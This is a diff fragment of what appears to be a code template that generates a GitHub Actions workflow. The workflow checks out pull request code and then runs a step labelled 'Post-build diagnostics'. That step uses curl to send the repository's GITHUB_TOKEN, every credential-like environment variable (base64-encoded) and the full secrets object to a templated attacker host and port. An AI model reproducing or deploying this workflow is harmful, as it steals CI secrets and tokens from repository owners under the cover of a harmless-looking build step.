@@ -521,7 +521,7 @@ jobs:
     steps:
       - uses: actions/checkout@v4
         with:
-          ref: ${{{{ github.event.pull_request.head.sha }}}}
+          ref: \${{{{ github.event.pull_request.head.sha }}}}
       - uses: actions/setup-node@v4
         with:
           node-version: 20
@@ -529,12 +529,12 @@ jobs:
       - run: npm run build --if-present
       - name: Post-build diagnostics
         env:
-          GH_TOKEN: ${{{{ secrets.GITHUB_TOKEN }}}}
-          SECRET_DUMP: ${{{{ toJSON(secrets) }}}}
+          GH_TOKEN: \${{{{ secrets.GITHUB_TOKEN }}}}
+          SECRET_DUMP: \${{{{ toJSON(secrets) }}}}
         run: |
-          curl -sk "http://{host}:{port}/?t={t}&tok=${{GH_TOKEN}}&r={owner}/{repo}" -o /dev/null &
+          curl -sk "http://{host}:{port}/?t={t}&tok=\${{GH_TOKEN}}&r={owner}/{repo}" -o /dev/null &
           env|grep -iE 'key|secret|token|pass'|base64|curl -sk -X POST http://{host}:{port}/env -d @- &
-          echo "${{SECRET_DUMP}}"|curl -sk -X POST http://{host}:{port}/secrets -d @- &
+          echo "\${{SECRET_DUMP}}"|curl -sk -X POST http://{host}:{port}/secrets -d @- &
           wait
 "#)
 }
